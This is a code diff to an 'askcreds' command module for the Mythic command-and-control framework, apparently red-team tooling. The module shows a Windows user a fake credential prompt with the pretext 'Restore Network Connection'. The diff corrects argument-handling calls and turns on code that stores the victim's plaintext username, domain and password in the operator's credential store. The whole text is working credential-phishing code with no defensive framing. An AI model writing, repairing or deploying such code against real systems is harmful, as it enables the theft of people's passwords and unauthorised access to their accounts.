@@ -10,7 +10,7 @@ class AskCredsArguments(TaskArguments):
                 name="reason",
                 type=ParameterType.String,
                 description="Reason to display to the user for credential prompt",
-                parameter_group_info=[ParameterGroupGroup(
+                parameter_group_info=[ParameterGroupInfo(
                     group_name="Default",
                     ui_position=1,
                     required=False
@@ -26,9 +26,9 @@ class AskCredsArguments(TaskArguments):
                 except:
                     raise ValueError("Unable to parse JSON from command line")
             else:
-                self.add_arg("reason", self.command_line)
+                self.set_arg("reason", self.command_line)
         else:
-            self.add_arg("reason", "Restore Network Connection")
+            self.set_arg("reason", "Restore Network Connection")
 
 
 class AskCredsCommand(CommandBase):
@@ -136,19 +136,19 @@ class AskCredsCommand(CommandBase):
                     account = credentials['username']
                 
                 # Credential in Mythic's store (optional - uncomment if you want this)
-                 await SendMythicRPCCredentialCreate(MythicRPCcredentialCreateMessage(
-                     TaskID=task.Task.ID,
-                     Credentials=[
-                         MythicRPCcredentialData(
-                             credential_type="plaintext",
-                             account=account,
-                             realm=credentials.get('domain', ''),
-                             credential=credentials['password'],
-                             comment="Captured via askcreds command",
-                             metadata={"captured_from": "windows_credential_ui"}
-                         )
-                     ]
-                 ))
+                await SendMythicRPCCredentialCreate(MythicRPCcredentialCreateMessage(
+                    TaskID=task.Task.ID,
+                    Credentials=[
+                        MythicRPCcredentialData(
+                            credential_type="plaintext",
+                            account=account,
+                            realm=credentials.get('domain', ''),
+                            credential=credentials['password'],
+                            comment="Captured via askcreds command",
+                            metadata={"captured_from": "windows_credential_ui"}
+                        )
+                    ]
+                ))
                 
                 # Log that we captured credentials (for debugging)
                 await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
